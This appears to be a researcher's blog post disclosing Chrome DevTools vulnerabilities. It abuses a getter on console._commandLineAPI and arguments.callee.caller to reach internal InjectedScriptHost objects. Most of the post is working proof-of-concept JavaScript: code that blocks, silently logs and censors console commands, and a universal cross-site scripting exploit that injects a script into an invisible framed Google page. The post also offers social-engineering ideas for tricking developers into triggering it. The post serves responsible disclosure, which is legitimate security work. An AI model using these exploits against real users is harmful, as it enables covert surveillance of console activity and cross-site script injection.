//-; { "title": "Google Chrome Universal XSS" }
:markdown
	# Exploiting the Google Chrome Developer Tools
	Recently, there was a front page Hacker News post asking [How does Facebook disable Developer Tools?](https://news.ycombinator.com/item?id=7222129) which linked a Stack Overflow question [here](http://stackoverflow.com/questions/21692646/how-does-facebook-disable-developer-tools). With the first part of the vulnerabilities I discovered being widely availible online I figured now was a good of time as any to write a post the rest of them.

	On a quick note before I get into the post, I'm looking for a Software Development or Information Security Internship/Mentorship in the Minneapolis/Twin Cities area. If you happen to have a position available, or know someone who does, please check out my [LinkedIn]() and if you feel I would be a good fit, contact me [here]().

	The vulnerabilities disclosed in the post have the following capabilities:
	* Detect the opening and executing of commands in the console. (Unpatched)
	* Prevent the execution of commands in the console (Unpatched)
	* Log the commands that are executed in the console (Unpatched)
	* Censor variables from being accessed/read from the console (Unpatched)
	* Other unexplored potential vulnerabilities that are children of these (Unpatched)
	* Use these vulnerabilities to execute arbitrary scripts on webpages that can be framed (Patched)

	To be clear, I have responsibly disclosed these vulnerabilities almost a full year ago and unless otherwise noted they remain unpatched. By Google's own [responsible disclose guidelines](http://googleonlinesecurity.blogspot.com/2010/07/rebooting-responsible-disclosure-focus.html) I have given many many months past the 60 day grace period for the issues to be fixed. You can find a full timeline of the issues reported in this post at the bottom. No reward was presented for the findings. I want to note that at the time of reporting the issues, I was only a Junior in high school and did not a have a large amount of experience reporting vulnerabilities. I have since gained more experience and looking back there are things I would have done differently, however I still believe that communication from Google could have been better overall. 

	The post is split up into the following sections, feel free to skip around, however it will make the most sense when read from top to bottom:
	* [Introduction](#Introduction)
	* [Vulnerability I](#Vulnerability_I)
	* [Blocking Console Access (Simple)](#Blocking_Console_Access_Simple)
	* [Introduction Part II](#Introduction_Part_II)
	* [Vulnerability II](#Vulnerability_II)
	* [Blocking Console Access (Advanced)](#Blocking_Console_Access_Advanced)
	* [Console Logging](#Console_Logging)
	* [Console Censorship](#Console_Censorship)
	* [Universal Cross Site Scripting](#UXSS)
	* [Final Vulnerabilities](#Final_Vulnerabilities)
	* [Summary](#Summary)
	* [Timeline](#Timeline)

	## <a name="Introduction"></a> Introduction

	Our story starts with a file named [InjectedScriptSource.js](https://code.google.com/p/chromium/codesearch#chromium/src/third_party/WebKit/Source/core/inspector/InjectedScriptSource.js) in the Chromium source code. This file is responsible for executing commands from the console you see when the developer tools are opened. I can hear people saying it already:

	> Wait just one second, why is a JavaScript file responsible for executing commands? I thought Chrome/Chromium is written in C++ not JavaScript.

	You are correct, the majority of Chrome/Chromium is not written in JavaScript, but the devtools are actually a webpage in and of themselves. As quick proof you can inspect the devtools page itself which is hosted at `chrome-devtools://devtools/bundled/devtools.html` by pressing the devtools shortcut on a un-docked, focused, devtools window. 

	But we're getting distracted from the original story. In the file [InjectedScriptSource.js](https://code.google.com/p/chromium/codesearch#chromium/src/third_party/WebKit/Source/core/inspector/InjectedScriptSource.js) around [line 624](https://code.google.com/p/chromium/codesearch#chromium/src/third_party/WebKit/Source/core/inspector/InjectedScriptSource.js&l=624) in the function `_evaluateOn` we can see the following code:
	```javascript
	prefix = "with ((console && console._commandLineAPI) || { __proto__: null }) {";
	suffix = "}";
	// *snip*
	expression = prefix + "\n" + expression + "\n" + suffix;
	```
	This function is one of many that are run when code is evaluated from the devtools console. This function is rather important because it is where devtools specific functions like `copy('String to Clip Board')` and `clear()` are added. These functions are members of the class `CommandLineAPI` of which `console._commandLineAPI` is an instance of. 

	## <a name="Vulnerability_I"></a>Vulnerability I

	Here's where things start to get interesting. I had the idea (and apparently someone at FaceBook too) to make use of the Getters and Setters added in ECMAScript 5. Getters and Setters allow a script to define a function to run when a key is retrieved or set. In this case, we're going to set one on the `console` object for the key `_commandLineAPI` with the following code:
	```javascript
	Object.defineProperty(console, '_commandLineAPI', {
		get: function () {
			console.log('A command was run');
		}
	});
	```
	You'll notice that if you view a page with this script (demo [here]()) as you are typing the script will report a command is being run before you press enter. This is because every few keypresses the devtools will attempt to lookup code completion suggestions, which qualify as their own command.

	## <a name="Blocking_Console_Access_Simple"></a>Blocking Console Access (Simple)
	So detecting when the console is loaded and when commands are run is fun, but let's see if we can try to disable commands. This is the same way FaceBook has created the same feature to warn users of potential attacks:
	```javascript
	Object.defineProperty(console, '_commandLineAPI', {
		get: function () {
			throw 'Console Disabled';
		}
	});
	```
	As you can see simply throwing an error when the `_commandLineAPI` is retrieved will prevent a command from being run or suggestions from working successfully. 

	## <a name="Introduction_Part_II"></a>Introduction Part II
	Before I can continue into a more advanced blocking of console access and other related exploits we have to first talk about JavaScript again. When a JavaScript function is created a scope for the function is created with a local variable `arguments` that contains an array of the arguments passed to the function. This has a few uses as one can imagine:
	```javascript
	function argCounter() {
		console.log('This function was run with ' + arguments.length + ' arguments.');
	}
	argCounter(); // 0
	argCounter('Hello', 'World') // 2
	argCounter(1, 2, 4, 8, 16, 32, 64) // 7
	```
	One of the less common known facts is that `arguments` is not an array but infact an object. This is why many JavaScript developers have encountered the following code which converts the object to a traditional JavaScript array:
	```javascript
	var args = Array.prototype.slice.call(arguments)
	```
	One of the reasons arguments is an object is it has a few reserved keys such as `callee` which refers to the currently executing function within it's own body. An example use case might be (where only anonymous functions are used):
	```javascript
	// Traverse an object looking for the 'World' key value
	var traverse = function(obj) {
		// Loop each key
		for (var index in obj) {
			// If another object
			if (typeof obj[index] === 'object') {
				// Recursion yay!
				arguments.callee(obj[index]);
			}
			// If matching
			if (index === 'World') {
				console.log('Found world: ' + obj[index]);
			}
		}
	};
	// Call traverse on our object
	traverse({
		'Nested': {
			'Hello': {
				'World': 'Earth'
			}
		}
	});
	```
	While this knowledge is pretty rare, the knowledge of the deprecated `arguments.callee.caller` is even rarer. This allows a script to reference the function that called it. It has little practical use, but I've attempted to create an example:
	```javascript
	// Print the ID of the caller of this function
	function call_Jim() {
		// Get the calling function name without the call_Jim_as part
		return 'Hi ' + arguments.callee.caller.name.substring('call_Jim_as_'.length) + '!'; 
	}
	// Call Jim as John
	function call_Jim_as_John() {
		return call_Jim();
	}
	// Call Jim as Luke
	function call_Jim_as_Luke() {
		return call_Jim();
	}
	// Test cases
	call_Jim_as_John(); // 'Hi John!'
	call_Jim_as_Luke(); // 'Hi Luke!'
	```
	Now, to get an another level deeper, we can call `arguments.callee.caller.arguments` and continue to traverse our way up the call stack to the top. 

	## <a name="Vulnerability_II"></a>Vulnerability II

	Using the above mentioned `arguments.callee.caller` functionality is where our second (and more valuable) vulnerability comes in. When a function is executed in the standard context with no parent functions `arguments.callee.caller` will simply be `null`. However, when a script is executed from the devtools console, instead of being null (as one would expect) it is instead the function `_evaluateOn` first mentioned at the beginning of the post. For example running the following code in the console will dump the source for the `_evaluateOn` function:
	```javascript
	(function () {
		return arguments.callee.caller;
	})();
	```
	I can already hear the questions again:

	> I guess this is bad, but what does it have to do with the first vulnerability and what can I do with it?

	Let's start with the relationship with the first vulnerability. In this case, getting a victim to copy and paste code such as the above is going to be difficult at best. What happens if we were to combine this with the initial vulnerability? We get the following:
	```javascript
	Object.defineProperty(console, '_commandLineAPI', {
		get: function () {
			console.log(arguments.callee.caller);
		}
	});
	```
	As you can see when these are combined, we get a script that can dump internal devtools sources when any key is pressed on the console. But I can still here the question:
	> So what? I can see those sources by looking at the Chromium source online. What's the big deal?

	The 'aha' moment for this exploit is this: `arguments.callee.caller.arguments` (notice the additional arguments key). This means that yes, our insecure code from an untrusted source can access internal devtools variables and objects in (at the time of this writing) all channels (stable, beta, dev, canary) of Chrome/Chromium.

	So, let's take a look at how we can exploit this. Let's start by seeing what our options are by creating a simple page:
	```html
	<script>
	Object.defineProperty(console, '_commandLineAPI', {
		get: function () {
			console.log(arguments.callee.caller.arguments[2]);
		}
	});
	</script>
	```
	Then running a command like `alert(1)` on the console which will result in the following (ignoring completion commands for now):
	```
	0: function evaluate() { [native code] }
	1: InjectedScriptHost
	2: "console"
	3: "with ((console && console._commandLineAPI) || {}) {↵alert(1)↵}"
	4: false
	5: true
	```
	Let's take a look at the second argument, InjectedScriptHost, to start. Looking in the Chromium source we can find that this object correlates with [InjectedScriptExterns.js](https://code.google.com/p/chromium/codesearch#chromium/src/third_party/WebKit/Source/core/inspector/InjectedScriptExterns.js). The InjectedScriptHost object contains a few methods, I'm going to focus on a few important ones:
	* **clearConsoleMessages** - Clears the console and deletes the scrollback
	```javascript
	InjectedScriptHost.clearConsoleMessages();
	```
	* **functionDetails** - Returns details about a function
	```javascript
	// Create a function with a bound this
	InjectedScriptHost.functionDetails(func);
	```
	* **inspect** - Inspect a dom object, doesn't switch to the inspect tab.
	```javascript
	// Inspect the body node
	InjectedScriptHost.inspect(document.body);
	```
	* **inspectedObject** - Retrieve an object from the history of inspected objects.
	```javascript
	// Get the first inspected object
	InjectedScriptHost.inspectedObject(0);
	```

	
	## <a name="Blocking_Console_Access_Advanced"></a>Blocking Console Access (Advanced)
	Now that we have an idea of the possible functions we can use, let's build a more advanced console blocking script. In this one, we want to still disable the console, but without the red, ugly error message when a command is run. Let's start with what happens when a command is run on the console. The `_evaluateOn` function is passed a few arguments:
	```
	evalFunction: function evaluate() { [native code] }
	object: InjectedScriptHost
	objectGroup: 'console'
	expression: 'alert(1)'
	isEvalOnCallFrame: false
	injectCommandLineAPI: true
	```
	And then runs the following code (modified for readability):
	```javascript
	var prefix = "";
	var suffix = "";
	if (injectCommandLineAPI && inspectedWindow.console) {
		inspectedWindow.console._commandLineAPI = new CommandLineAPI(this._commandLineAPIImpl, isEvalOnCallFrame ? object : null);
		prefix = "with ((console && console._commandLineAPI) || { __proto__: null }) {";
		suffix = "}";
	}
	if (prefix)
		expression = prefix + "\n" + expression + "\n" + suffix;
	var result = evalFunction.call(object, expression);
	```
	A quick look at the `evalFunction` will tell us that it's merely `InjectedScriptHost.evaluate`. Too bad we don't have any way to override that, oh wait, we can just add a setter. Here's a quick proof of concept that will disable the console with no errors logged:
	```javascript
	// First run
	var run = false;
	// On console command run
	Object.defineProperty(console, '_commandLineAPI', {
		get: function () {
			// Only run once
			if (!run) {
				run = true;
				// Get the InjectedScriptHost
				var InjectedScriptHost = arguments.callee.caller.arguments[1];
				// On evaluate
				Object.defineProperty(InjectedScriptHost, 'evaluate', {
					get: function () {
						// Return a alternate evaluate function
						return function() {
							return "The console has been disabled";
						}
					}
				});
			}
		}
	});
	```

	## <a name="Console_Logging"></a>Console Logging
	Okay, you can probably guess that the point of the above exercise was not to remove the red text. Let's have some more fun, let's write a script that allows the console to act exactly as expected, but log all commands run and their results. This could easily be sent to a server for logging, but I'll leave that implementation up to you, the reader. One quick note, this implementation ignores suggestions, this is because suggestions are implemented as such that they are only a result of a array, and cannot be easily logged. So, onto the proof of concept:
	```javascript
	// First run
	var run = false;
	// Save the command line api
	var _commandLineAPI = null;
	// On console command run
	Object.defineProperty(console, '_commandLineAPI', {
		get: function () {
			// Only run once
			if (!run) {
				run = true;
				// Get the InjectedScriptHost
				var InjectedScriptHost = arguments.callee.caller.arguments[1];
				// On evaluate
				Object.defineProperty(InjectedScriptHost, 'evaluate', {
					get: function () {
						// Return a alternate evaluate function
						return function(command) {
							// Get the commands split
							var commands = command.split("\n");
							// Execute the real evaluate function
							var result = InjectedScriptHost.__proto__.evaluate.apply(this, arguments);
							// Ignore suggustion executions for now
							if (commands.length <= 1 || (result && result.name === 'getCompletions')) {
								return result;
							}
							// Remove the first "with..." and last "}" lines
							command = commands.slice(1, -1).join("\n");
							// Next step to ignore suggustion checks
							if (command.trim() === 'this') {
								return result;
							}
							// Log the command and result (tries to lazily parse to a string for now)
							document.write("Attempted Command:<br /><pre>" + command + "</pre>");
							document.write("Command Result:<br /><pre>" + result + "</pre><hr />");
							// Return the result
							return result;
						}
					}
				});
			}
			// Return the actual command line api
			return _commandLineAPI;
		},
		set: function(value) {
			// Copy the value
			_commandLineAPI = value;
		}
	});
	```

	## <a name="Console_Censorship"></a>Console Censorship
	Logging commands is fun, but let's see if we can censor a variable from being accessed without viewing a source. Here's a quick proof of concept (it's not 100% perfect, but should give a good understanding of what can be done):
	```javascript
	// Add our secret key and value
	window.secret = 'Top secret key here';
	// First run
	var run = false;
	// Save the command line api
	var _commandLineAPI = null;
	// On console command run
	Object.defineProperty(console, '_commandLineAPI', {
		get: function () {
			// Only run once
			if (!run) {
				run = true;
				// Get the InjectedScriptHost
				var InjectedScriptHost = arguments.callee.caller.arguments[1];
				// On evaluate
				Object.defineProperty(InjectedScriptHost, 'evaluate', {
					get: function () {
						// Return a alternate evaluate function
						return function(command) {
							// Execute the real evaluate function
							var result = InjectedScriptHost.__proto__.evaluate.apply(this, arguments);
							// When the command was a attempt to access the completions
							if (result && result.name === 'getCompletions') {
								// Return a new completions function
								return function() {
									// Get the completions
									var completions = result.apply(this, arguments);
									// Remove the secret completion
									delete completions.secret;
									// Return the modified values
									return completions;
								}
							}
							// If the result is our secret value
							if (result === window.secret) {
								return undefined;
							}
							// Return the result
							return result;
						}
					}
				});
			}
			// Return the actual command line api
			return _commandLineAPI;
		},
		set: function(value) {
			// Copy the value
			_commandLineAPI = value;
		}
	});
	```
	## <a name="UXSS"></a>Universal Cross Site Scripting
	Let's get into the one vulnerability that has been patched. This vulnerability allowed a malicious website to inject arbitrary scripts, html, etc to any website that could be framed via an iframe with some user interaction. It works pretty simply, when a user inspects an element, it is added to a history array. A user can access it via `console.$0`, but unfortunately cannot access this if it is executed from a different domain. For the exploit to be viable: A user must right click a iframe element, then open the console and begin to type a command. 

	While this is clearly a convoluted path, there are many ways to have a user complete these actions. For example, I have hypothesized a following game:
	```
	SpaceShip Wars
	The game involves a user playing against a computer battling their own SpaceShips.
	When a SpaceShip is damaged, it must be repaired by a user.
	To repair a part, the user must right click and inspect the individual element to fix it.
	Once the element is being inspected they can fix it by typing "fix" in the Console.
	```
	Of course, there are many social engineering options possible to trick users to attack themselves. Personally, I think the best option would be to simply do nothing and wait for developers (the more valuable targets) to attack themselves. But, onto the proof of concept. It has a simple, full screen, invisible iframe of picasa.google.com (contains/contained Google domain cookies). Inspecting any point on the page, then beginning to type a command on the console will trigger a `alert(document.domain)` from the iframe:
	```javascript
	// On console command run
	Object.defineProperty(console, '_commandLineAPI', {
		get: function () {
			// Save a reference to the InjectedScriptHost globally
			window.InjectedScriptHost = arguments.callee.caller.arguments[1];
			// Get the injectedScript object
			window.injectedScript = InjectedScriptHost.functionDetails(arguments.callee.caller.arguments.callee).rawScopes[0].object.injectedScript;
			// Trigger another inspect (not sure why this helps but it does)
			injectedScript._inspect(document.getElementById('hacks'));
			// Keep checking if an element has been inspected every 10th of a second
			var check = function() {
				// Hide any errors on the console to keep people unaware
				try {
					// Get the first inspected object
					var el = injectedScript._commandLineAPIImpl._inspectedObject(1);
					// Loop until no more parents
					while (el.parentNode) { el = el.parentNode; }
					// If the element is not the current page
					if (el.URL !== window.location.href) {
						// Stop checking
						clearInterval(check);
						// Create the script element
						var script = document.createElement('script');
						script.type = 'text/javascript';
						script.innerHTML = "alert(document.domain)";
						// Add the script to the frame
						el.getElementsByTagName('head')[0].appendChild(script);
					}
				} catch (e) {}
			};
			// Return the orginal evaluate function
			return InjectedScriptHost.__proto__.evaluate;
		}
	});
	```
	As you can see there is clearly a lot of potential for abuse here, thankfully this issue was patched. Though not by the Chrome team (as far as I can tell) by the WebKit team [here](http://trac.webkit.org/changeset/138228).

	## <a name="Final_Vulnerabilities"></a>Final Vulnerabilities
	You may have noticed the use of `InjectedScriptHost.functionDetails`. This is the most powerful function and opens a whole bunch of doors to other potential issues. The `functionDetails` allows the inspection of a functions location (which file and what line) as well as the scopes that function executes in. Here's a quick example of it's use in a generic setting:
	```javascript
	// Add another scope
	with ({
		'test': true
	}) {
		var func = function() {}
	}
	// Log the details
	console.log(InjectedScriptHost.functionDetails(func));
	```
	Which returns the following result:
	```
	{
		location: {
			columnNumber: 14,
			lineNumber: 4,
			scriptId: "1262"
		},
		name: "func",
		rawScopes: [
			{
				object: {
					test: true
				},
				type: 2
			}, {
				object: { },
				type: 2
			}, {
				object: [object Window],
				type: 3
			}
		]
	}
	```
	As you can see this has some powerful potentials, particularly when applied to internal functions. For example, when applied to the `_evaluateOn` function we get the following result:
	```
	{
		inferredName: "InjectedScript._evaluateOn",
		location: {
			columnNumber: 25,
			lineNumber: 591,
			scriptId: "1417"
		},
		rawScopes: [
			{
				object: {
					CommandLineAPI: function CommandLineAPI(commandLineAPIImpl, callFrame)
					InjectedScript: function ()
					InjectedScriptHost: InjectedScriptHost
					Object: function Object() { [native code] }
					bind: function bind(func, thisObject, var_args)
					injectedScript: InjectedScript
					injectedScriptId: 58
					inspectedWindow: Window
					slice: function slice(array, index)
					toString: function toString(obj)
				},
				type: 3
			}, {
				object: [object Window],
				type: 0
			}
		]
	}
	```
	There are all sorts of internal objects inside these functions that have the potential for other abuse. A wrote a quick function that loops all functions it can find and lists the potentially valuable ones (all scopes not the current window):
	```javascript
	// Run via console as `listScopes();`
	function listScopes() {
		// Total results
		var results = 0;
		// Ignore these because they are cyclical
		var cyclical = [
			'window.top',
			'window.window',
			'window.clientInformation.mimeTypes',
			'window.clientInformation.plugins',
			'window.console._commandLineAPI.$_',
			'func[0].object.inspectedWindow',
			'func[1].object'
		];
		// Element that have been chacked already
		var checked = [];
		// Save a reference to the InjectedScriptHost globally
		var InjectedScriptHost = arguments.callee.caller.arguments[1];
		// Get the scope of a function
		window.scope = function(func, i) {
			return InjectedScriptHost.functionDetails(func).rawScopes[i].object;
		}
		// Check the scopes of an object
		function checkScopes(current_name, obj) {
			// Loop each key
			for (var index in obj) {
				// If the var has not been checked
				if (checked.indexOf(obj[index]) === -1) {
					checked.push(obj[index]);
					var name = current_name;
					if (isNaN(index)) {
						name = name + '.' + index;
					} else {
						name = name + '[' + index + ']';
					}
					// If not cyclical
					if (cyclical.indexOf(name) === -1) {
						// If an array or object
						if (typeof obj[index] === 'object') {
							// Yay recursion
							checkScopes(name, obj[index]);
						}
					}
					if (typeof obj[index] === 'function') {
						// Get the scopes
						var scopes = InjectedScriptHost.functionDetails(obj[index]).rawScopes;
						// Don't index our scopes function
						if (obj[index] !== window.scope) {
							// Loop each scope
							for (var i in scopes) {
								// If it's not a window
								if (InjectedScriptHost.internalConstructorName(scopes[i].object) !== 'Window') {
									name = 'scope(' + name + ', ' + i + ')';
									// Add the path
									console.log(name);
									results++;
									// Recursion again
									checkScopes(name, scopes[i].object);
								}
							}
						}
					}
				}
			}
		}
		// Check all known objects
		checkScopes('window', window);
		window.args = arguments.callee.caller.arguments;
		checkScopes('args', args);
		window.func = InjectedScriptHost.functionDetails(arguments.callee.caller).rawScopes;
		checkScopes('func', func);
		// Return
		return "Searching finished, found " + results + " results.";
	};
	```
	It can be run via `listScopes()` on the console. It is probably buggy, and misses a few potential paths, but it gives a quick idea of the potential. 
	## <a name="Summary"></a>Summary
	The vulnerabilities outlined in the post allow the following:
	* Detect the opening and executing of commands in the console. (Unpatched)
	* Prevent the execution of commands in the console (Unpatched)
	* Log the commands that are executed in the console (Unpatched)
	* Censor variables from being accessed/read from the console (Unpatched)
	* Other unexplored potential vulnerabilities that are children of these (Unpatched)
	* Use these vulnerabilities to execute arbitrary scripts on webpages that can be framed (Patched)

	The exploits require little technical ability to exploit (many people can write some simple JavaScript), and the majority of them have remained unpatched for over a year. I hope that this post will help get those vulnerabilities fixed. 
	## <a name="Timeline"></a>Timeline
	* February 25th, 2013: Disclosed to vendor (Google)
	* February 25th, 2013: Initial vendor response
	* February 26th, 2013: Issue marked as Priority 0
	* February 26th, 2013: Response from vendor
	* February 27th, 2013: Response to vendor with more information about severity
	* February 27th, 2013: Issue marked as Priority 2 and Severity Low
	* February 28th, 2013: Communication with vendor
	* September 27th, 2013: Request to disclose vulnerability publicly (no response)
	* February 5th, 2014: Issue made public [here](https://code.google.com/p/chromium/issues/detail?id=178336)